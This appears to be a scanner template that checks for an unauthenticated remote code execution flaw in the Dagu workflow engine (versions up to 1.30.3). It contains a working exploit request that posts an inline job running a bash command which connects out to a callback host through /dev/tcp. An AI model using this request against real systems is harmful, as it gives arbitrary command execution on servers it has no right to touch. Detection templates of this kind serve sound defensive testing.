id: dagu-rce
brief:
    title: Dagu Workflow Engine - Remote Code Execution
    by: omarkurt
    level: critical
    about: Dagu (<= 1.30.3) ships with authentication disabled by default. The POST /api/v2/dag-runs endpoint accepts inline YAML DAG specifications and immediately executes shell commands without credentials.
    label:
        - dagu
        - rce
        - oob
        - unauth
        - vuln
    score: CVSS:9.8
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/api/v2/dag-runs'
      head:
        Content-Type: application/json
      body: '{"name":"vt-{{dag_name}}","spec":"steps:\n  - name: oob\n    command: bash -c ''echo vt > /dev/tcp/{{interactsh-url}}/80''\n"}'
      signs: []
